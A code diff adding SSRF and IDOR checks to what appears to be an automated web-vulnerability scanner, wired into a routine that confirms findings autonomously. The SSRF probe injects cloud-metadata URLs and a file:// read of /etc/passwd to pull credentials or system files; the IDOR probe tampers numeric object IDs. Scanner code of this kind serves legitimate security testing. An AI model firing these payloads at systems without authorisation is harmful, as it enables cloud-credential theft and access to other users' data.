@@ -1206,6 +1206,61 @@ class AssistSession:
                 return True
         return False
 
+    _IMDS_RE = re.compile(r"ami-id|instance-id|iam/security-credentials|"
+                          r"computeMetadata|\"AccessKeyId\"|placement/availability-zone", re.I)
+    _AUTHZ_DENY_RE = re.compile(r"(?i)forbidden|unauthor|access denied|not allowed|"
+                                r"permission denied|\b403\b|\b401\b|login required")
+
+    def confirm_ssrf(self, url: str, param: str, method: str = "GET", extra=None) -> bool:
+        """Confirm server-side request forgery IN-BAND: make the server fetch a URL whose
+        response carries a definitive marker. Cloud metadata (IMDS) and file:// reads are
+        the high-value, deterministic cases (blind SSRF needs an OOB listener). Governed."""
+        cases = (
+            ("http://169.254.169.254/latest/meta-data/", self._IMDS_RE,
+             "SSRF to cloud metadata (IMDS credential theft)", "critical"),
+            ("http://metadata.google.internal/computeMetadata/v1/", self._IMDS_RE,
+             "SSRF to GCP metadata", "critical"),
+            ("file:///etc/passwd", self._PASSWD_RE, "SSRF file read (file:// scheme)", "critical"),
+        )
+        for payload, rx, label, sev in cases:
+            body, _s, _h = self._probe(url, param, payload, method, extra)
+            if body and rx.search(body):
+                self._record_confirmed(url, label, sev, param,
+                                       f"payload {payload!r} fetched by the server")
+                return True
+        return False
+
+    def confirm_idor(self, url: str, param: str, method: str = "GET", extra=None) -> bool:
+        """Heuristic IDOR check: a numeric object id, when changed, returns a DIFFERENT
+        valid object (200, same template, different content) with no access-control block.
+        Recorded as a CANDIDATE (medium) — true IDOR needs the operator to confirm the
+        object belongs to another principal; this surfaces the strong signal to verify."""
+        import difflib
+        from urllib.parse import parse_qsl, urlsplit
+        cur = dict(parse_qsl(urlsplit(url).query)).get(param, "")
+        n = int(cur) if cur.isdigit() else 1
+        base, _s, _h = self._probe(url, param, str(n), method, extra)
+        if not base or self._AUTHZ_DENY_RE.search(base):
+            return False
+        for nb in (str(n + 1), str(max(0, n - 1)), str(n + 2)):
+            body, _s2, _h2 = self._probe(url, param, nb, method, extra)
+            if not body or self._AUTHZ_DENY_RE.search(body) or len(body) < 50:
+                continue
+            sim = difflib.SequenceMatcher(None, base, body).ratio()
+            if body != base and 0.3 < sim < 0.98:      # different object, same page shape
+                self._record_candidate(
+                    url, "Potential IDOR (unauthorised object access)", "medium", param,
+                    f"changing {param}={n}→{nb} returns a different object with no authz block")
+                return True
+        return False
+
+    def _record_candidate(self, target, title, sev, param, evidence) -> None:
+        from .findings import Finding
+        self.findings.add(Finding(title=title, severity=sev, target=target, evidence=evidence,
+                                  source=f"active probe · param={param}", param=param,
+                                  category="web", confirmed=False))
+        self.notes.append(f"[lead] {title} on {target} param '{param}' — {evidence}")
+
     def confirm_surface(self, max_params: int = 8) -> int:
         """Autonomously confirm boolean SQLi + reflected XSS on the GET parameters the
         crawl discovered — turning candidates into CONFIRMED findings without waiting
@@ -1214,7 +1269,8 @@ class AssistSession:
         if self.browser is None or self.surface is None:
             return 0
         checks = (self.confirm_sqli, self.confirm_cmdi, self.confirm_lfi,
-                  self.confirm_ssti, self.confirm_xss, self.confirm_open_redirect)
+                  self.confirm_ssti, self.confirm_xss, self.confirm_ssrf,
+                  self.confirm_open_redirect, self.confirm_idor)
         confirmed = tried = 0
         for base, names in list(self.surface.params.items()):
             for p in list(names):
